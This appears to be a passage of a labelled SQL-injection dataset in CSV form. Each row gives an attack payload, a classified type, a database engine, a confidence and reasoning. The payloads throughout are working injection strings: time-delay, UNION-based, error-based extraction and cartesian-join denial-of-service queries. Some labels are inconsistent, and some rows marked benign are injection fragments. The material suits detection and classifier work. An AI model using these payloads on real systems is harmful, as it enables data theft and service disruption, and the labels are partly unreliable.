id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22584,"-8118"" ) where 3561 = 3561 or ( 8459 = 8459 ) *4906--",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure with arithmetic. Generic boolean-blind",2
22585,"1"" ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ""zxks"" = ""zxks",time_blind,mysql,0.70,"Rule: elt() (P3). Heuristic: benign. sleep(5) inside elt() suggests time_blind extraction via MySQL conditional",1
22586,"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""kfdh"" like ""kfdh",heavy_query,generic,0.85,"Rule: generic keywords. Heuristic: 500000000 constant triggers heavy_query. Cartesian join DoS pattern confirmed",2
22587,"1"" ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,"Rule and Heuristic: generate_series(1,5000000) = PostgreSQL heavy_query DoS confirmed",2
22588,"1"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""rtzn"" = ""rtzn",time_blind,oracle,0.85,"Rule and Heuristic: dbms_pipe.receive_message() (P5, Oracle-exclusive). Time-based blind via pipe communication",2
22589,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( 'ootz' like 'ootz",boolean_blind,db2,0.70,"Rule: generic keywords. Heuristic: boolean structure. DB2 system table cartesian join - boolean_blind confirmed",2
22590,"1%' ) or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.70,"Rule: generic pattern. Heuristic: boolean with cartesian join. Oracle system table + 5-table join = heavy_query",2
22591,-8023' or 6872 = 6872,boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (6872 = 6872). Generic boolean-blind pattern",2
22592,"-6067'+ ( select 'bfhf' where 3114 = 3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight columns. Data exfiltration confirmed",2
22593,"-9297 ) union all select 6841,6841,6841,6841,6841--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with five columns",2
22594,"-4905"" union all select 6082,6082--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT minimal structure",2
22595,"1' where 3760 = 3760 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight null columns",2
22596,1' ) where 3311 = 3311,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22597,"1"" ) ) as tljw where 8474 = 8474 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird rdb$database system table access",2
22598,"1"" ) ) ) and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. System table cartesian join (7 tables)",2
22599,1'+ ( select bgbq where 1589 = 1589 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +',boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. Char concatenation for binary encoding",2
22600,"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 )",error_based,mysql,0.85,"Rule: extractvalue() (P4, MySQL). Heuristic: heavy_query. MySQL error-based extraction via XPath confirmed",2
22601,"1 ) as keog where 8033 = 8033 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",heavy_query,mysql,0.70,"Rule: generic keywords. Heuristic: heavy_query via floor(rand). extractvalue() visible but heuristic prioritizes DoS pattern",1
22602,1'|| ( select 'ovlx' where 8767 = 8767 or sleep ( 5 ) ) ||',time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) function (P5, MySQL). Time-based blind confirmed",2
22603,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""unju"" = ""unju",time_blind,sqlite,0.85,"Rule and Heuristic: randomblob(500000000/2) (P5, SQLite). Time-based delay via blob generation",2
22604,1 ) ) ) and sleep ( 5 ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22605,"-5761"" ) or 3762 = 1274",boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (3762 = 1274). Generic boolean-blind",2
22606,"1"" ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""pyfz"" like ""pyfz",error_based,oracle,0.85,"Rule and Heuristic: ctxsys.drithsx error function (P4, Oracle). Error-based extraction confirmed",2
22607,"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with nine columns",2
22608,"1%"" ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( ""%"" = """,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Arithmetic expression without clear injection context",2
22609,"1"" ) where 6964 = 6964",benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22610,1' ) as wquy where 2518 = 2518,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22611,"1"" ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""jydy"" like ""jydy",heavy_query,postgresql,0.85,"Rule: generic keywords. Heuristic: generate_series(1,5000000) = PostgreSQL heavy_query DoS confirmed",2
22612,"1"" ) as gffq where 4387 = 4387 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --",heavy_query,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. extractvalue() visible but DoS pattern takes precedence",2
22613,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'vjdk' like 'vjdk",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join",2
22614,1'+ ( select mhfn where 2425 = 2425,boolean_blind,generic,0.50,"Rule: generic keywords. Heuristic: boolean structure. Generic SQL without clear signal",1
22615,-9541 where 4291 = 4291 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. Char concatenation for binary encoding",2
22616,"1"" ) ) union all select null,null,null,null--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with four null columns",2
22617,1' where 8231 = 8231,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22618,"1 union all select null,null,null,null--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT structure confirmed",2
22619,1 ) as fxfe where 1148 = 1148 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22620,"1"" ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""pmmr"" = ""pmmr",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. System table cartesian join (7 tables)",2
22621,"1' in boolean mode ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) #",heavy_query,generic,0.70,"Rule: generic keywords. Heuristic: 5000000000 constant = heavy_query DoS pattern confirmed",2
22622,1' ) ) as qpai where 2619 = 2619,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22623,"1"" ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( ""eslj"" like ""eslj",error_based,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. updatexml() (P4, MySQL) error-based extraction confirmed",2
22624,"1"" ) ) as yutu where 1306 = 1306 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,0.85,"Rule and Heuristic: dbms_pipe.receive_message() (P5, Oracle). Time-based blind confirmed",2
22625,"1 where 5925 = 5925 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.70,"Rule: generic keywords. Heuristic: boolean structure. DB2 system table cartesian join (3 tables)",2
22626,"1%' ) union all select null,null,null,null,null,null,null#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with seven null columns",2
22627,"1 ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 3294 = 3294",error_based,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. updatexml() (P4, MySQL) error-based extraction confirmed",2
22628,"-9541 ) as bnky where 3934 = 3934 union all select 3934,3934,3934#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with three columns",2
22629,"1"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""stcv"" = ""stcv",error_based,mysql,0.85,"Rule: extractvalue() (P4). Heuristic: heavy_query. extractvalue() takes precedence over benchmark in error-based extraction",2
22630,1' ) as akvn where 8669 = 8669,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22631,"1' and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'ankn' = 'ankn",heavy_query,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. floor(rand)*2 + GROUP_CONCAT = MySQL error/DoS hybrid pattern",2
22632,"1"" ) ) as zemm where 3324 = 3324 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"Rule: generic keywords. Heuristic: boolean structure. Firebird system table cartesian join (4 tables)",2
22633,"1 ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 4924 = 4924",heavy_query,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. floor(rand)*2 + GROUP_CONCAT = MySQL error/DoS hybrid",2
22634,"-6267"" ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""rqws"" = ""rqws",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. Char concatenation for binary encoding",2
22635,-4351' ) or 6525 = 9458,boolean_blind,generic,0.70,"Rule and Heuristic: OR equality (6525 = 9458). Generic boolean-blind",2
22636,-6665' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'winx' = 'winx,error_based,oracle,0.85,"Rule and Heuristic: xmltype() (P4, Oracle). Error-based extraction confirmed",2
22637,"1%"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ""%"" = """,time_blind,mysql,0.85,"Rule and Heuristic: benchmark() (P5, MySQL). Time-based blind via heavy computation",2
22638,"1'|| ( select 'baur' from dual where 9384 = 9384 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,oracle,0.85,"Rule: boolean structure. Heuristic: 5000000000 constant = Oracle heavy_query DoS confirmed",2
22639,"iif ( 6307 = 2459,1,1/0 )",benign,generic,0.50,"Rule: no SQLi signal. Heuristic: benign. IIF() appears but lacks WHERE context",2
22640,"1"" ) ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ( ""hhwy"" = ""hhwy",error_based,mysql,0.85,"Rule: generic keywords. Heuristic: heavy_query. extractvalue() + benchmark hybrid = error-based extraction",2
22641,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'lkun' like 'lkun",error_based,mysql,0.85,"Rule and Heuristic: extractvalue() (P4, MySQL). Error-based extraction via procedure analyse confirmed",2
22642,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'foju' = 'foju,error_based,oracle,0.85,"Rule and Heuristic: xmltype() (P4, Oracle). Error-based extraction confirmed",2
22643,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( 'oskf' like 'oskf",boolean_blind,generic,0.70,"Rule: generic keywords. Heuristic: boolean structure. Oracle all_users table cartesian join (5 tables)",2
22644,"1"" and make_set ( 8403 = 8403,8899 ) and ""bbgg"" = ""bbgg",benign,generic,0.50,"Rule: generic keywords. Heuristic: benign. make_set() context lacks clear injection",2
22645,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""zzca"" = ""zzca",time_blind,mysql,0.70,"Rule: elt() (P3). Heuristic: benign. sleep(5) visible - time_blind extraction via conditional logic",1
22646,1' ) ) ) and 7401 = 9838#,boolean_blind,generic,0.70,"Rule and Heuristic: AND equality (7401 = 9838). Generic boolean-blind",2
22647,1' ) ) as vnwn where 8774 = 8774 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,0.85,"Rule and Heuristic: sleep(5) (P5, MySQL). Time-based blind confirmed",2
22648,"end and ( ( ""kvts"" like ""kvts",benign,generic,0.50,"Rule: no signal. Heuristic: benign. Incomplete SQL fragment",2
22649,-6566' ) as kggb where 9768 = 9768 order by 1--,benign,generic,0.50,"Rule: no signal. Heuristic: benign. ORDER BY reconnaissance without clear injection",2
22650,"1'+ ( select 'bztp' where 2541 = 2541 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with ten null columns",2
22651,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight columns",2
22652,"-6581'|| ( select 'hpjd' where 7608 = 7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with eight columns",2
22653,"-2414%"" ) or elt ( 1032 = 1032,3623 ) and ( ""%"" = """,benign,generic,0.50,"Rule: elt() (P3). Heuristic: benign. Lacks clear injection context",1
22654,"1' ) where 3579 = 3579 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",heavy_query,generic,0.70,"Rule: generic keywords. Heuristic: heavy_query. 500000000 constant + information_schema = DoS pattern",2
22655,"1' or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.70,"Rule: generic keywords. Heuristic: boolean structure. DB2 system table cartesian join (3 tables)",2
22656,"1' where 8360 = 8360 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.85,"Rule and Heuristic: dbms_pipe.receive_message() (P5, Oracle). Time-based blind confirmed",2
22657,"1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ""%"" = """,time_blind,mysql,0.70,"Rule: rlike() (P3). Heuristic: boolean structure. sleep(5) visible - time_blind extraction priority",1
22658,1' ) as tqdg where 9355 = 9355,benign,generic,0.50,"Rule: no signal. Heuristic: benign. Simple WHERE equality",2
22659,"-7388"" ) as rlth where 5746 = 5746 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,"Rule and Heuristic: ctxsys.drithsx (P4, Oracle). Error-based extraction confirmed",2
22660,"1"" where 4991 = 4991 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.70,"Rule: generic keywords. Heuristic: 5000000000 constant = heavy_query DoS pattern",2
22661,"-3518 ) union all select 1877,1877,1877,1877#",union_based,generic,0.85,"Rule and Heuristic: UNION ALL SELECT with four columns",2
